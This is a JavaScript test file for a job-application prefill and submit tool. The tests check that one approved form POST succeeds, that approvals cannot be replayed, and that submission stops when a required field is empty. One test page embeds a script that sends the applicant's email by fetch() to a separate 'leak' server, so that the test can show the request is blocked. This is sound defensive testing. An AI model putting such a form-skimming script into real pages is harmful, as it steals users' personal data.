import test from 'node:test'
import assert from 'node:assert/strict'
import { createServer } from 'node:http'

import { closePrefillBrowser, prefillApplicationPage } from '../prefiller.js'
import { closeAllPrefillSessions, getPrefillSession } from '../sessionStore.js'
import { submitPrefilledApplication } from '../submitter.js'

async function listen(handler) {
  const requests = []
  const server = createServer((req, res) => {
    requests.push({ method: req.method, url: req.url })
    handler(req, res)
  })
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  return {
    origin: `http://127.0.0.1:${address.port}`,
    requests,
    close: () => new Promise(resolve => server.close(resolve)),
  }
}

function localSubmitPolicy(origin) {
  return ({ url, method, resourceType, navigationRequest }) => {
    const parsed = new URL(url)
    if (parsed.origin !== origin) return { allowed: false, write: false }
    const verb = String(method || '').toUpperCase()
    if (verb === 'POST') return { allowed: true, write: true }
    if (verb === 'OPTIONS') return { allowed: true, write: false }
    if ((verb === 'GET' || verb === 'HEAD') && navigationRequest && resourceType === 'document') {
      return { allowed: true, write: false }
    }
    return { allowed: false, write: false }
  }
}

function approvedFields() {
  return [
    {
      key: 'name',
      label: 'Full name',
      inputType: 'text',
      kind: 'identity',
      value: 'Asha Rao',
      evidenceSource: 'profile.name',
    },
    {
      key: 'email',
      label: 'Email',
      inputType: 'email',
      kind: 'contact',
      value: 'asha@example.com',
      evidenceSource: 'profile.email',
    },
  ]
}

async function cleanup(...servers) {
  await closeAllPrefillSessions()
  await closePrefillBrowser()
  for (const server of servers) await server?.close?.()
}

test('submit_once allows one legitimate form POST, blocks foreign leak, captures confirmation and closes session', async () => {
  const leak = await listen((_req, res) => {
    res.writeHead(204)
    res.end()
  })
  let app
  app = await listen((req, res) => {
    if (req.method === 'GET' && req.url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
      res.end(`<!doctype html><html><body>
        <form action="/apply" method="post">
          <label for="name">Full name</label><input id="name" name="name" required>
          <label for="email">Email</label><input id="email" name="email" type="email" required>
          <button type="submit">Submit application</button>
        </form>
        <script>
          document.querySelector('button').addEventListener('click', () => {
            const value = document.querySelector('#email').value
            fetch('${leak.origin}/leak', { method: 'POST', body: value }).catch(() => {})
          })
        </script>
      </body></html>`)
      return
    }
    if (req.method === 'POST' && req.url === '/apply') {
      req.resume()
      req.on('end', () => {
        res.writeHead(303, { Location: '/success' })
        res.end()
      })
      return
    }
    if (req.method === 'GET' && req.url === '/success') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
      res.end('<!doctype html><html><body><h1>Thank you for applying</h1></body></html>')
      return
    }
    res.writeHead(404)
    res.end()
  })

  try {
    const prefill = await prefillApplicationPage({
      connectorId: 'greenhouse',
      target: { url: `${app.origin}/`, origin: app.origin },
      approvedFields: approvedFields(),
      requestId: 'prefill-submit-test',
    }, {
      timeoutMs: 10_000,
      submitRequestPolicy: localSubmitPolicy(app.origin),
    })

    const now = new Date()
    const validatedRequest = {
      connectorId: 'greenhouse',
      target: { url: `${app.origin}/`, origin: app.origin },
      approval: {
        id: 'approval-submit-test',
        connectorId: 'greenhouse',
        jobUrl: `${app.origin}/`,
        jobId: 'job-1',
        sessionId: prefill.session.id,
        approvedAt: now.toISOString(),
        expiresAt: new Date(now.getTime() + 60_000).toISOString(),
      },
    }

    const outcome = await submitPrefilledApplication(validatedRequest, {
      now: now.getTime() + 100,
      settleDelayMs: 200,
      settleTimeoutMs: 2_000,
    })

    assert.equal(outcome.attempted, true)
    assert.equal(outcome.confirmed, true)
    assert.equal(outcome.status, 'submitted_confirmed')
    assert.equal(outcome.confirmationSignal, 'thank_you')
    assert.equal(outcome.network.postRequestCount, 1)
    assert.ok(outcome.network.navigationRequestCount >= 1)
    assert.ok(outcome.network.blockedRequestCount >= 1)
    assert.equal(outcome.sessionClosed, true)
    assert.equal(await getPrefillSession(prefill.session.id), null)

    assert.equal(app.requests.filter(item => item.method === 'POST' && item.url === '/apply').length, 1)
    assert.equal(leak.requests.length, 0)
    assert.equal(JSON.stringify(outcome).includes('asha@example.com'), false)
    assert.equal(JSON.stringify(outcome).includes('Asha Rao'), false)

    await assert.rejects(
      submitPrefilledApplication(validatedRequest, { now: now.getTime() + 200 }),
      error => error.code === 'submit_session_not_found',
    )
  } finally {
    await cleanup(app, leak)
  }
})

test('live required-field gap blocks before network and same approval cannot be replayed', async () => {
  const app = await listen((req, res) => {
    if (req.method === 'GET' && req.url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
      res.end(`<!doctype html><html><body>
        <form action="/apply" method="post">
          <label for="name">Full name</label><input id="name" name="name" required>
          <label for="email">Email</label><input id="email" name="email" type="email" required>
          <label for="phone">Phone</label><input id="phone" name="phone" type="tel" required>
          <button type="submit">Apply</button>
        </form>
      </body></html>`)
      return
    }
    if (req.method === 'POST' && req.url === '/apply') {
      res.writeHead(200, { 'Content-Type': 'text/html' })
      res.end('unexpected')
      return
    }
    res.writeHead(404)
    res.end()
  })

  try {
    const prefill = await prefillApplicationPage({
      connectorId: 'greenhouse',
      target: { url: `${app.origin}/`, origin: app.origin },
      approvedFields: approvedFields(),
      requestId: 'prefill-required-gap',
    }, {
      timeoutMs: 10_000,
      submitRequestPolicy: localSubmitPolicy(app.origin),
    })

    const now = new Date()
    const validatedRequest = {
      connectorId: 'greenhouse',
      target: { url: `${app.origin}/`, origin: app.origin },
      approval: {
        id: 'approval-gap-test',
        connectorId: 'greenhouse',
        jobUrl: `${app.origin}/`,
        jobId: 'job-2',
        sessionId: prefill.session.id,
        approvedAt: now.toISOString(),
        expiresAt: new Date(now.getTime() + 60_000).toISOString(),
      },
    }

    const outcome = await submitPrefilledApplication(validatedRequest, { now: now.getTime() + 100 })
    assert.equal(outcome.status, 'blocked_pre_submit')
    assert.equal(outcome.attempted, false)
    assert.equal(outcome.sessionClosed, false)
    assert.ok(outcome.blockers.some(item => item.code === 'submit_required_live_field_empty' && item.detail === 'phone'))
    assert.equal(app.requests.some(item => item.method === 'POST'), false)

    const retained = await getPrefillSession(prefill.session.id)
    assert.ok(retained)
    assert.equal(retained.networkState.mode, 'frozen')
    assert.equal(retained.networkState.browserOffline, true)

    await assert.rejects(
      submitPrefilledApplication(validatedRequest, { now: now.getTime() + 200 }),
      error => error.code === 'submit_approval_replayed',
    )
  } finally {
    await cleanup(app)
  }
})
